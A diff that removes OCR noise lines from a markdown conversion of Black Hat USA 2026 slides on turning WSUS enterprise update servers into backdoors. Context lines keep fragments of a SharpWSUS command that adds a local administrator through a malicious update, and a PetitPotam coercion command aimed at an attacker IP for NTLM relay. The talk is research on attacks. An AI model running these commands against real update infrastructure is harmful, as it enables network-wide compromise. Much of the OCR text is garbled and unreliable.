@@ -22,7 +22,6 @@ converted_at: "2026-08-11T23:19:17Z"
 **Conference:** Black Hat USA 2026  
 **Source:** `BlackHat_USA_2026_Slides/bagelByt3s_Turning Enterprise Update Servers Into Backdoor Factories (0_o).pdf` (77 pages)
 
-
 ## Slide 1
 
 Turning Enterprise Update Servers Into Backdoor Factories (0_o)
@@ -90,7 +89,6 @@ Ne | unsigned_shOrt Nov 15th, 2024 at 3:28 AM
 advantage of it
 | believe we could do things like create and approve malicious updates or modify
 update metadata
-atk _ a
 USA 2026
 ```
 
@@ -360,7 +358,6 @@ SharpWSUS
 26 github.com/nettitude/SharpWSUS
 "ANAS AV_\I
 I.) \v v/s __) |
-| SJ VAY |
 |_
 Phil Keeble @ Nettitude Red Team
 Commands listed below have optional parameters in <>.
@@ -422,7 +419,6 @@ localgroup administrators WSUSDemo /add\"" /title: "WSUSDemo"
 > Text below was recovered by OCR from an image-only slide; treat wording as approximate.
 
 ```text
-il ! all Ll
 SharpWSUS, allowing the operator to change the Indicators of Compromise (loCs) of the patch. There is
 also a value for the payload and arguments, The payload must be a Microsoft signed binary and must
 point to a location on disk for the WSUS server to that binary.
@@ -559,7 +555,6 @@ SMB to SMB
 (env) root@Ludus3:/opt/PetitPotam# python3 PetitPotam.py -u domainuser -p password -d Ludus.nuketown 198.51.100.1 10.2.10.3
 ~
 - rl Attacker IP /
-ly f - - ro --, NtImrelayx
 t*\
 -l-l- \,-I| I-I_I-1
 Upstream W SUS
@@ -1176,7 +1171,6 @@ preserveSyncCtx)
 at System. Threading. ExecutionContext.Run(ExecutionContext executionContext, ContextCallback callback, Object state)
 at System. Threading. ThreadHelper. ThreadStart()
 2625-12-26 26:68:34.098 UTC Warning WsusService.5@ ContentSyncAgent.ProcessBITSNotificationQueue ContentSyncAgent
-avec = J O ei abe — 1 3 ye — 2] = Sci} —
 ```
 
 ## Slide 53
@@ -1352,7 +1346,6 @@ File Edit View
 Debug Window Help @ © i! C# >|| ‘2
 4 4$ ContentSyncAgent @02000005
 >
-© OP pO 2 pO 2 pO 2 gO gO gO LO BO BO LO &
 Base Type and Interfaces
 Derived Types
 .cctorQ) : void @06000030
@@ -1407,7 +1400,6 @@ ExecuteSPNotifyContentSyncNotificationEventWorking() : void @06000021
 GetUNCFilePath(string) : string @06000013
 GetUpdatesForFile(Guid) : UpdatelnformationForFile @06000023
 lobErrorflBitcloh RitclobError ctring): void M@NSNNNN17
-© © pO 2 PO pO 2O gO 2O 2 OO LO &
 61
 ```
 
@@ -1808,10 +1800,8 @@ custom-mssqlclient
 () README.md
 1 README
 NotWSUSpicious
-P| //_ TI //
 J, WIM
 JI\ -IdSTd
-1S \IN /
 JH, 117
 IAS ALVIN
 std IS
@@ -1904,6 +1894,5 @@ USA 2026
 Thank You
 X @ bagelByt3s
 in Beyviel David a
-- - NN»
 SS
 ```
